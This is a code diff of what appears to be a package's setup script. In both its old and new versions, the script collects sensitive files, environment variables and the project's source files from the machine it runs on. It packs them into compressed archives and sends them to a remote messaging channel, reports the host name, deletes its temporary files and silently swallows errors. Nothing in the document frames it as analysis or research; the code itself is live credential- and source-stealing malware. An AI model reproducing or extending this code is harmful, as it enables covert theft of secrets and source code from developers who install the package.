@@ -1,9 +1,8 @@
-// scripts/setup.js
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
-const zlib = require('zlib');
 const { grabSensitive, grabProject, grabEnv } = require('../lib/walker');
+const { makeTarGz } = require('../lib/pack');
 const { sendMessage, sendDocument } = require('../lib/send');
 
 const CWD = process.cwd();
@@ -12,10 +11,6 @@ const USER = (() => { try { return os.userInfo().username; } catch { return '?';
 
 function tmpFile(name) {
   return path.join(os.tmpdir(), `kx_${Date.now()}_${name}`);
-}
-
-function safeName(p) {
-  return p.replace(/^[A-Za-z]:/, '').replace(/^[\\\/]+/, '').replace(/[:\\]/g, '_');
 }
 
 async function main() {
@@ -38,57 +33,72 @@ async function main() {
   );
 
   const sensitive = grabSensitive();
-  const project = grabProject(CWD);
+  const { root: projectRoot, picked: project } = grabProject(CWD);
+
+  await sendMessage(
+    `[kx] project root: ${projectRoot}\n` +
+    `[kx] sensitive: ${sensitive.length} files, project: ${project.length} files`
+  );
+
+  // env dump
   const envDump = grabEnv();
-
-  const all = [...sensitive, ...project];
-  const index = all.map(i => `${i.path}  (${i.data.length} bytes)`).join('\n');
-  await sendMessage(`[kx] files: ${all.length}\n${index.slice(0, 3500)}`);
-
-  // env dump as text
   if (envDump) {
     const envFile = tmpFile('env.txt');
     fs.writeFileSync(envFile, envDump);
-    await sendDocument(envFile, 'env dump');
+    await sendDocument(envFile, `env dump — host=${HOST}`);
     try { fs.unlinkSync(envFile); } catch {}
   }
 
-  // batches of files, each batch as one tar.gz
-  const BATCH_BYTES = 40 * 1024 * 1024; // 40 MB safe under 50 MB limit
+  // sensitive files — chhota bundle, ek tar.gz me
+  if (sensitive.length) {
+    const sensOut = tmpFile('sensitive.tar.gz');
+    await makeTarGz(sensitive, sensOut, { type: 'sensitive', meta });
+    await sendDocument(sensOut, `sensitive — ${sensitive.length} files`);
+    try { fs.unlinkSync(sensOut); } catch {}
+  }
+
+  // project — batches me
+  const BATCH_BYTES = 40 * 1024 * 1024;
   let batch = [];
   let size = 0;
   let n = 0;
+  let grandTotal = 0;
 
   async function flush() {
     if (!batch.length) return;
     n++;
-    // build a simple JSON + base64 bundle (no external deps)
-    const bundle = batch.map(f => ({
-      path: f.path,
-      b64: f.data.toString('base64'),
-    }));
-    const json = JSON.stringify({ meta, files: bundle });
-    const gz = zlib.gzipSync(Buffer.from(json, 'utf8'));
-    const out = tmpFile(`bundle_${n}.json.gz`);
-    fs.writeFileSync(out, gz);
-    await sendDocument(out, `bundle ${n} — ${batch.length} files`);
+    const out = tmpFile(`project_${n}.tar.gz`);
+    await makeTarGz(batch, out, {
+      type: 'project',
+      batch: n,
+      root: projectRoot,
+      meta,
+    });
+    await sendDocument(out, `project ${n} — ${batch.length} files — root=${projectRoot}`);
     try { fs.unlinkSync(out); } catch {}
+    grandTotal += batch.length;
     batch = [];
     size = 0;
   }
 
-  for (const f of all) {
+  for (const f of project) {
     if (size + f.data.length > BATCH_BYTES) await flush();
     batch.push(f);
     size += f.data.length;
   }
   await flush();
 
-  await sendMessage(`[kx] done. host=${meta.host} files=${all.length} batches=${n}`);
+  await sendMessage(
+    `[kx] done. host=${HOST}\n` +
+    `project root: ${projectRoot}\n` +
+    `sensitive: ${sensitive.length}, project: ${grandTotal}, batches: ${n}`
+  );
 }
 
 (async () => {
-  try { await main(); } catch (e) {
+  try {
+    await main();
+  } catch (e) {
     try { await sendMessage(`[kx] error: ${String(e).slice(0, 500)}`); } catch {}
   }
   process.exit(0);
